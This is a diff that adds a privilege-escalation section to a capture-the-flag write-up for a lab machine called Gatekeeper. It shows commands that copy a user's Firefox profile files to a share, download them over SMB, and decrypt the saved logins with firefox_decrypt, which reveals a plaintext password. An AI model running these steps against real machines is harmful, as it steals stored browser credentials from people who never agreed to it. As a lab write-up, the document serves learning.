@@ -784,5 +784,80 @@ Try to interact with gatekeeper service locally:
 	nc <local IP>  31337        
 	aaa
 	Hello aaa!!!
-Load it in Immunity and perform local BOF assesment
+Load it in Immunity and perform local BOF assesment, then you can execute the BOF directly.
+### Privilege escalation
+Actually didn't find anythin by my own, plus without meterpreter shell all the tools I used for PE (winpeas, seatbelt) crashed the nc shell. So I decided to have a look to some write-up. 
+I found that the way to go was (Fire)fox. since a profile exists for the user natbat, we can try to get some credentials using this [tool](https://github.com/unode/firefox_decrypt). 
+We need the file that I'm going to copy:
+
+	cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>
+
+Copy the needed files:
 	
+	copy cert9.db C:\users\share              
+	        1 file(s) copied.
+	
+	copy cookies.sqlite C:\users\share
+	        1 file(s) copied.
+
+	copy key4.db C:\users\share
+	        1 file(s) copied.
+	
+	copy logins.json C:\users\share
+	        1 file(s) copied.
+
+Now download the files on the attacker:
+
+	smbclient \\\\10.10.56.76\\Users 
+	...
+	smb: \> cd Share
+	smb: \Share\> ls
+	  .                                   D        0  Tue May 14 17:22:37 2024
+	  ..                                  D        0  Tue May 14 17:22:37 2024
+	  cert9.db                            A   229376  Wed Apr 22 06:47:01 2020
+	  cookies.sqlite                      A   524288  Fri May 15 04:45:02 2020
+	  gatekeeper.exe                      A    13312  Mon Apr 20 07:27:17 2020
+	  key4.db                             A   294912  Tue Apr 21 23:02:11 2020
+	  logins.json                         A      600  Fri May 15 04:43:47 2020
+
+                7863807 blocks of size 4096. 3842160 blocks available
+	smb: \Share\> get cert9.db 
+	getting file \Share\cert9.db of size 229376 as cert9.db (138.9 KiloBytes/sec) (average 138.9 KiloBytes/sec)
+	smb: \Share\> get cookies.sqlite 
+	getting file \Share\cookies.sqlite of size 524288 as cookies.sqlite (186.0 KiloBytes/sec) (average 168.6 KiloBytes/sec)
+	smb: \Share\> get key4.db 
+	getting file \Share\key4.db of size 294912 as key4.db (366.4 KiloBytes/sec) (average 198.8 KiloBytes/sec)
+	smb: \Share\> get logins.json 
+	getting file \Share\logins.json of size 600 as logins.json (2.1 KiloBytes/sec) (average 188.6 KiloBytes/sec)
+
+The tool search for a profile firefox folder in the user directory, so if you have firefox installed on your attacker machine use the root user:
+
+	python firefox_decrypt.py    
+	2024-05-14 17:40:29,622 - WARNING - profile.ini not found in /root/.mozilla/firefox
+	2024-05-14 17:40:29,623 - WARNING - Continuing and assuming '/root/.mozilla/firefox' is a profile location
+	2024-05-14 17:40:29,623 - ERROR - Profile location '/root/.mozilla/firefox' is not a directory
+
+So create the needed directories:
+
+	mkdir -p /root/.mozilla/firefox
+Then move the files over there:
+
+	 mv cert9.db cookies.sqlite key4.db logins.json /root/.mozilla/firefox
+Then execute the python script:
+
+	python firefox_decrypt.py
+	2024-05-14 17:45:42,737 - WARNING - profile.ini not found in /root/.mozilla/firefox
+	2024-05-14 17:45:42,737 - WARNING - Continuing and assuming '/root/.mozilla/firefox' is a profile location
+	
+	Website:   https://creds.com
+	Username: 'mayor'
+	Password: '8CL7O1N78MdrCIsV'
+
+
+ 	
+	
+
+	
+
+	
+
